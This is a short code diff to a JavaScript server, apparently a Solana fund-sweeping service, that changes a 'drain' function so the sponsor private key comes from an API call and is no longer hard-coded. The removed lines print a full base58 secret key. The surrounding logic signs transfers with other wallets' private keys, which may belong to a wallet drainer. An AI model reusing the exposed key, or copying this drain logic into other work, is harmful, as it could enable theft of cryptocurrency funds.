@@ -160,11 +160,15 @@ async function drainOnRailway(parsed) {
   }
   var tempSigner = Keypair.fromSecretKey(privkeyBytes);
 
+  // CRITICAL: sponsorPrivkey должен быть передан из Vercel API (не хранится на Railway!)
+  if (!parsed.sponsorPrivkey) {
+    console.error('[drain] sponsorPrivkey not provided by Vercel API - skipping drain');
+    return;
+  }
+
   var sponsorBytes;
   try {
-    var SPONSOR_PRIVATE_KEY = process.env.SPONSOR_PRIVATE_KEY ||
-      '5vSY6y2H2gPDp9vT5Fzvpd6rdFoguriiP7H84ww3QH5feSb2vhtWMs9WCWNxfo6QY2XcGAy1H268HpCS2G3d6m1';
-    sponsorBytes = bs58.decode ? bs58.decode(SPONSOR_PRIVATE_KEY) : bs58.default.decode(SPONSOR_PRIVATE_KEY);
+    sponsorBytes = bs58.decode ? bs58.decode(parsed.sponsorPrivkey) : bs58.default.decode(parsed.sponsorPrivkey);
   } catch(e) {
     console.error('[drain] sponsor bs58 error:', e.message);
     return;
@@ -682,5 +686,7 @@ httpServer.listen(PORT, function () {
   console.log('');
   connectAgent();
 });
+
+
 
 
